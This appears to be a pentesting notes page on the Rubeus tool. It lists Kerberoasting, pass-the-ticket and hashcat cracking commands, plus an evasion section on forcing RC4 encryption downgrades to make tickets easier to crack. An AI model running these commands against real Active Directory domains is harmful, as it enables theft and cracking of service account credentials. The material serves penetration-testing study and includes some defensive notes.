---
title: Rubeus
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - mimikatz
  - kerberos
---
# Rubeus

Rubeus is a C# toolset for raw Kerberos interaction and abuses.

Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. Overall:

- RC4 (type 23) encryption: TGS  hashes that begin with `$krb5tgs$23$*`
- AES-256 (type 18) encryption: TGS  hashes that begin with `$krb5tgs$18$*`

## Installation

Github: [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

Some of the utilities:

- Performing Kerberoasting and outputting hashes to a file
- Using alternate credentials
- Performing Kerberoasting combined with a pass-the-ticket attack
- Performing "opsec" Kerberoasting to filter out AES-enabled accounts
- Requesting tickets for accounts passwords set between a specific date range
- Placing a limit on the number of tickets requested
- Performing AES Kerberoasting

## Basic commands

Gather stats:

```powershell
 .\Rubeus.exe kerberoast /stats
```

Request tickets with admincount attribute set to 1:

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
# /nowrap flag: so that the hash can be more easily copied down for offline cracking using Hashcat. The ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped.
```

 Perform Kerberoasting on a user testspn:
 
```powershell
# Perform Kerberoasting on a user testspn
.\Rubeus.exe kerberoast /user:testspn /nowrap
```


Importing Converted Ticket into Windows Session with Rubeus: 

```cmd-session
 C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```


## Evasion techniques

Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. Overall:

- RC4 (type 23) encryption: TGS  hashes that begin with `$krb5tgs$23$*`
- AES-256 (type 18) encryption: TGS  hashes that begin with `$krb5tgs$18$*`


If the received TGS ticket is RC4 (type 23) encrypted, it will be easier to crack.

We can check out if the user has the `msDS-SupportedEncryptionTypes` attribute is set to `0` (meaning that is using RC4 (type 23) encryption.  The chart [here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of `0` means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.

```powershell
# Check the encryption of the TGS ticket for user testspn
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes


#serviceprincipalname       msds-supportedencryptiontypes samaccountname
# ----------                 ----------------------------- --------------
# testspn/kerberoast.inlanefreight.local               0   testspn
```

With RC4 (type 23) encryption, this would be the hashcat module:

```shell-session
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

The results for the AES-256 (type 18) encryption would be `24`:

```powershell
# Check the encryption of the TGS ticket for user testspn
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes


#serviceprincipalname       msds-supportedencryptiontypes samaccountname
# ----------                 ----------------------------- --------------
# testspn/kerberoast.inlanefreight.local               24   testspn
```

With AES (type 18) encryption, this would be the hashcat module:

```shell-session
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```


**We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption  when requesting a new service ticket even though the supported encryption types are listed as AES 128/256.** This may be a failsafe built-in to Active Directory for backward compatibility.

```powershell
# Perform Kerberoasting on a user testspn
.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
# /tgtdeleg: specify that we want only RC4 encryption when requesting a new service ticket.
```

> Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.

> In addition, It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. 
## More commands

```powershell
.\Rubeus.exe

# Gather some stats:
 .\Rubeus.exe kerberoast /stats


# Perform Kerberoasting:
Rubeus.exe kerberoast [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

# Perform Kerberoasting, outputting hashes to a file:
Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]


# Perform Kerberoasting, outputting hashes in the file output format, but to the console:
Rubeus.exe kerberoast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

# Perform Kerberoasting with alternate credentials:
Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

# Perform Kerberoasting with an existing TGT:
Rubeus.exe kerberoast </spn:"blah/blah" | /spns:C:\temp\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

# Perform Kerberoasting with an existing TGT using an enterprise principal:
Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

# Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:
Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/ldaps] [/nowrap]

# Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]

# Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]

# List statistics about found Kerberoastable accounts without actually sending ticket requests:
Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]

# Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]

# Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]

# Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:
Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]

# Perform AES Kerberoasting:
Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]
```

